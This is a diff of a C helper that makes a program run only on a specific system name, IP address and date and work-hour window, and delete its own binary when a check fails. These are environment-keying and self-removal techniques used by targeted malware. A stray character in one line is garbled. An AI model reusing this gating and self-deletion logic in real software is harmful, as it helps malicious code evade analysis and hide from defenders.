@@ -6,32 +6,48 @@
 */
 
 #include "valHelper.h"
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+int main(){
+	val_SysName();
+	val_IP();
+	val_time();
+};
+
 
 /* ======== Validating ======= */
 
 
 void val_SysName(){
-    #ifdef VALID_SYSNAME
+    #ifdef SYSN
     struct utsname uts;
     uname(&uts);
-    if (strcmp(uts.sysname, VALID_SYSNAME)==0) return;
+    if (strcmp(uts.sysname, SYSN)==0){
+	   printf("System name aligns\n");
+		   return;
+    }
     else{
         #ifdef DEBUG
-            printf("NOT Target System");
+            printf("NOT Target System\n");
+	    remove ("valHelper");
         #endif
         exit(EXIT_FAILURE);
     }
     #endif
 }
 
+
 void val_IP(){
-    #ifdef VALID_IP
+    #ifdef IPNUM
     struct ifaddrs *ifaddr, *ifa;
     int family, s;
     char host[NI_MAXHOST];
-
+	
+  
     if (getifaddrs(&ifaddr) == -1){
-        my_perror("getifaddrs");
+        perror("getifaddrs");
         exit(EXIT_FAILURE);
     }
 
@@ -59,17 +75,18 @@ void val_IP(){
             freeifaddrs(ifaddr);
 
             // this the one!
-            if (strcmp(host, VALID_IP)==0){
+            if (strcmp(host, IPNUM)==0){
                 return;
             }
             // wrong IP!
             else{
-                my_perror("Wrong IP!");
+                perror("Wrong IP!");
+		remove("valHelper");
                 exit(EXIT_FAILURE);
             }
         }
     }
-    my_perror("Interface not part of AF_INET Family!");
+    perror("Interface not part of AF_INET Family!");
     exit(EXIT_FAILURE);
     #endif
 }
@@ -98,11 +115,9 @@ int date_cmp(struct date d1, struct date d2) {
     printf("%02d/%02d/%d\n", d.mm, d.dd, d.yy);
 };
 
-
-void val_time(){
-    #ifdef VALID_TIME
+void val_time(){    
     time_t now;
- 
+  
     // Obtain current time
     time(&now);
     struct tm *local = localtime(&now);
@@ -114,7 +129,7 @@ void val_time(){
     char* token;
 
     // ==== START_DATE PARSING ===
-    char start_date[] = {START_DATE};
+    char start_date[] = {STRD};
     char start_month[3];
     char start_day[3];
     char start_year[5];
@@ -131,7 +146,7 @@ void val_time(){
 
     // === END_DATE PARSING ===
     token = NULL;
-    char end_date[] = {END_DATE};
+    char end_date[] = {ENDD};
     char end_month[3];
     char end_day[3];
     char end_year[5];
@@ -146,7 +161,9 @@ void val_time(){
     struct date date_end = {atoi(end_day), atoi(end_month), atoi(end_year)};
     date_print(date_end);
 
+
    /* ===== Checking the Dates =====*/
+
 
    int cmp_cur_strt = date_cmp(date_cur, date_start);
    int cmp_cur_end = date_cmp(date_cur, date_end);
@@ -154,13 +171,16 @@ void val_time(){
     // date >= start_date
     if(cmp_cur_strt == 1 || cmp_cur_strt == 0){
         // date <= end_date
-        if(cmp_cur_end == -1 || cmp_cur_end == 0)
-            ;// Within dates, move on to check TIME
+        if(cmp_cur_end == -1 || cmp_cur_end == 0){
+	printf("Within acceptable dates. Running");
+	}
+	// Within dates, move on to check TIME
         // date > end_date
         else{
             //uninstall (should be called in main anyway) and exit
             #ifdef DEBUG
                 printf("Past end date. Exiting!");
+		remove("valHelper");
             #endif
             exit(EXIT_FAILURE);
         }
@@ -176,6 +196,7 @@ void val_time(){
         return;
     }
 
+
     /*
     time >= WORK_START --> check end_time
         time < end_time --> execute
@@ -184,6 +205,9 @@ void val_time(){
     */
     int cur_hr = local->tm_hour;
 
+    int WORK_START = 9;
+    int WORK_END = 17;
+	
     // after start of work day
     if( cur_hr >= WORK_START){
         // perfect timing!
@@ -210,7 +234,7 @@ void val_time(){
         val_time();
         return;
     }
-    #endif
+    
 }
 
 
@@ -219,7 +243,7 @@ void val_time(){
     /resources/misc/profilerDemo.c
     https://stackoverflow.com/questions/4757512/execute-a-linux-command-in-the-c-program
 */
-
+/*
 struct Profile* getProfile(){
     struct utsname uts;
     uname(&uts);
@@ -246,7 +270,7 @@ char* strProfile(){
     strcat(giantList,uts.release);
     strcat(giantList,"\n");
 
-    strcat(giantList,uts.version);
+8   strcat(giantList,uts.version);
     strcat(giantList,"\n");
 
     FILE *fp;
@@ -269,10 +293,12 @@ char* strProfile(){
     fgets(path, sizeof(path), fp);
     strcat(giantList, path);
     //strcat(giantList,"\n");
-
-    /* close */
+    //
+   
+    
     pclose(fp);
     return giantList;
+    
 }
-
+*/
 
